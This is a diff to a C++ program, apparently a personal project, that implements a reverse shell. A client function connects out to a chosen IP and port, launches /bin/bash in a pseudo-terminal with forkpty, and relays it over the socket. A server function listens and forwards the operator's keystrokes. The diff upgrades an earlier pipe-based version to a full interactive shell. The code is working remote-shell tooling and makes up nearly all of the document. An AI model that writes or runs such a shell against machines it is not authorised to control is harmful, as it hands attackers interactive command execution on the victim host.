@@ -1,28 +1,41 @@
-
-
 #include "utils.h"
 #include "args_parser.h"
-
 
 // error msgs
 std::string pipeFailed = "[!] Pipe creation failed!";
 std::string forkFailed = "[!] Fork creation failed!";
 std::string execlFailed = "[!] Execl failed!";
+std::string failedToOpenClientSoc = "[!] Failed to create client socket!";
+std::string serverDisconnected = "[!] Server Disconnected!";
+std::string failedToAcceptClient = "[!] Failed to accept incoming connection!";
 
 // placeholder for now
 void server(const std::string &serverIpAddr, unsigned int portNum) {
     int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (serverSocket < 0) {
+        std::cout << "Failed to create server socket!" << std::endl;
+        exit(EXIT_FAILURE);
+    }
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET; // define IPV4
     serverAddr.sin_port = htons(portNum); // set port, htons coverts port to byte order
     serverAddr.sin_addr.s_addr = inet_addr(serverIpAddr.c_str()); // listen on any available IP (allow further config?)
 
-    bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
+    // check bind is okay
+    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
+        std::cout << "Failed to bind server socket!" << std::endl;
+        exit(EXIT_FAILURE);
+    }
 
-    // socket, max number of queued connections
+    // check we can listen on bind
+    if (listen(serverSocket, 5) < 0) {
+        std::cout << "Failed to listen on server socket!" << std::endl;
+        exit(EXIT_FAILURE);
+    }
 
-    listen(serverSocket, 5);
+    std::cout << "[+] Server listening on " << serverIpAddr << ":" << portNum << std::endl;
 
     // get info on connecting client
     struct sockaddr_storage clientAddr;
@@ -31,39 +44,66 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
 
     int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
 
+    // check we were able to accept connection from client
+    if (clientSocket < 0) {
+        safeShutdown(failedToAcceptClient, serverSocket, clientSocket);
+    }
+
+    // get some info for server user
     struct sockaddr_in *s = (struct sockaddr_in *)&clientAddr;
     int clientPort = ntohs(s->sin_port); // converts byte to port number
     inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr
-
     std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;
 
-    char buffer[2048];
+    fd_set fdSet;
+    char ttyBuffer[4096];
     while (true) {
+        // setting up select() func
+        FD_ZERO(&fdSet);
+        FD_SET(clientSocket, &fdSet); // data from client
+        FD_SET(STDIN_FILENO, &fdSet); // data from stdin
 
-        // placeholder
-        std::cout << "[client_hostname] ";
+        int maxFd = std::max(clientSocket, STDIN_FILENO) + 1;
+        // see if we are getting any data from the client or from our own stdin
+        int activity = select(maxFd, &fdSet, nullptr, nullptr, nullptr);
 
-        std::string msgToSend;
-        std::getline(std::cin, msgToSend);
-
-        send(clientSocket, msgToSend.c_str(), msgToSend.length(), 0);
-
-        memset(buffer, 0, sizeof(buffer));
-        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
-
-        if (bytesReceived <= 0) {
-            std::cout << "[!] Client Disconnected!" << std::endl;
+        if (activity < 0 ) {
             break;
         }
 
-        if (std::string(buffer) == "exit") {
-            std::cout << "[!] Received exit from Client!" << std::endl;
-            break;
+        // Data from client -> server
+        if (FD_ISSET(clientSocket, &fdSet)) {
+            // read incoming data
+            ssize_t bytesReceived = recv(clientSocket, ttyBuffer, sizeof(ttyBuffer), 0);
+            // if no data, client has disconnected and we can exit
+            if (bytesReceived <= 0) {
+                std::cout << "[!] Client disconnected" << std::endl;
+                break;
+            }
+            // print output from client
+            std::cout.write(ttyBuffer, bytesReceived);
+            std::cout.flush();
         }
 
-        std::cout << buffer << std::endl;
+        // Data from input -> to then send to client
+        if (FD_ISSET(STDIN_FILENO, &fdSet)) {
+            // read input
+            ssize_t input = read(STDIN_FILENO, ttyBuffer, sizeof(ttyBuffer));
+
+            if (input > 0) {
+                // if input is 'exit' we know we want to quit
+                std::string inputCmd(ttyBuffer, input);
+                if (inputCmd.find("exit") != std::string::npos) {
+                    // execute shutdown
+                    safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket);
+                }
+
+                // if not 'exit' send to client
+                send(clientSocket, ttyBuffer, input, 0);
+            }
+        }
     }
-
+    close(clientSocket);
     close(serverSocket);
 }
 
@@ -72,101 +112,72 @@ void client(const std::string &ipAddr, unsigned int portNum) {
 
     int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
 
+    if (clientSocket < 0) {
+        std::cout << "Failed to create client socket!" << std::endl;
+        exit(1);
+    }
+
     // socket info
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(portNum);
     serverAddr.sin_addr.s_addr = inet_addr(ipAddr.c_str());
-    connect(clientSocket, (struct sockaddr*)&serverAddr,sizeof(serverAddr));
     char socket_buffer[1024];
+
+    if (connect(clientSocket, (struct sockaddr*)&serverAddr,sizeof(serverAddr)) < 0) {
+        std::cout << "Failed to connect to server!" << std::endl;
+        close(clientSocket);
+        exit(-1);
+    }
+
     std::cout << "[+] Connected to server successfully" << std::endl;
 
-    // pipe info for running /bin/bash
-    int to_child[2]; // parent -> child proc
-    int from_child[2]; // child -> parent proc
+    int masterFd;
+    pid_t childPid = forkpty(&masterFd, nullptr, nullptr, nullptr);
 
-    // try and open pipe
-    if (pipe(to_child) == -1 || pipe(from_child) == -1) {
-        std::cout << pipeFailed << std::endl;
-        //communicate with server pipe failed
-        const char *message = pipeFailed.c_str();
-        send(clientSocket, message, strlen(message), 0);
-        exit(-1); //temp
+    if (childPid < 0) {
+        safeShutdown(forkFailed, clientSocket, masterFd);
     }
-
-    pid_t childPid = fork();
-    if (childPid == -1) {
-
-        std::cout << forkFailed << std::endl;
-        const char *message = forkFailed.c_str();
-        send(clientSocket, message, strlen(message), 0);
-        exit(-1);
-    }
-
     if (childPid == 0) {
-        //child proc
-        dup2(to_child[0], STDIN_FILENO);
-        dup2(from_child[1], STDOUT_FILENO);
-        dup2(from_child[1], STDERR_FILENO);
+        execl("/bin/bash", "bash", nullptr);
+        safeShutdown(execlFailed, clientSocket, masterFd);
+    }
 
-        close(to_child[1]);
-        close(from_child[0]);
+    fd_set fds;
+    char ttyBuffer[4096];
 
-        execl("/bin/bash", "bash", NULL);
-        std::cout << execlFailed << std::endl;
-        const char *message = execlFailed.c_str();
-        send(clientSocket, message, strlen(message), 0);
-        exit(-1);
-    } else {
-        //parent proc
-        close(to_child[0]);
-        close(from_child[1]);
+    while (true) {
+        FD_ZERO(&fds);
+        FD_SET(clientSocket, &fds);
+        FD_SET(masterFd, &fds);
 
-        fcntl(from_child[0], F_SETFL, O_NONBLOCK);
-
-        char pipe_buffer[1024];
-
-        // sending connection request
-        while (true){
-            memset(socket_buffer, 0, sizeof(socket_buffer));
-
-            int bytesReceived = recv(clientSocket, socket_buffer, sizeof(socket_buffer), 0);
-
-            if (bytesReceived >= 0) {
-                //std::cout << "[+] Msg received: " << buffer << std::endl;
-            }
-
-            if (std::string(socket_buffer) == "exit") {
-                std::cout << "[!] Received exit from Server!" << std::endl;
-                break;
-            }
-
-            std::string cmdToPipe = std::string(socket_buffer);
-
-            cmdToPipe += "\n";
-
-            write(to_child[1], cmdToPipe.c_str(), cmdToPipe.size());
-
-            usleep(100000); // small delay
-            while (true) {
-                ssize_t n = read(from_child[0], pipe_buffer, sizeof(pipe_buffer) - 1);
-                if (n > 0) {
-                    pipe_buffer[n] = '\0';
-                    //std::cout << pipe_buffer << sizeof(pipe_buffer) << std::endl; //debug
-                } else {
-                    break; // No more data for now
-                }
-            }
-            send(clientSocket, pipe_buffer, strlen(pipe_buffer), 0);
+        int maxFd = std::max(clientSocket, masterFd) + 1;
+        int activity = select(maxFd, &fds, nullptr, nullptr, nullptr);
+        if (activity < 0 ) {
+            break;
         }
 
-        close(to_child[1]);
-        close(from_child[0]);
-        wait(nullptr);
+        // from server to tty
+        if (FD_ISSET(clientSocket, &fds)) {
+            ssize_t bytesReceived = recv(clientSocket, ttyBuffer, sizeof(ttyBuffer), 0);
+            if (bytesReceived <= 0) {
+                std::cout << serverDisconnected << std::endl;
+                break;
+            }
+            write(masterFd, ttyBuffer, bytesReceived);
+        }
+
+        if (FD_ISSET(masterFd, &fds)) {
+            ssize_t n = read(masterFd, ttyBuffer, sizeof(ttyBuffer));
+            if (n > 0) {
+                send(clientSocket, ttyBuffer, n, 0);
+            }
+        }
     }
 
-    // closing socket
     close(clientSocket);
+    close(masterFd);
+    wait(nullptr);
 }
 
 
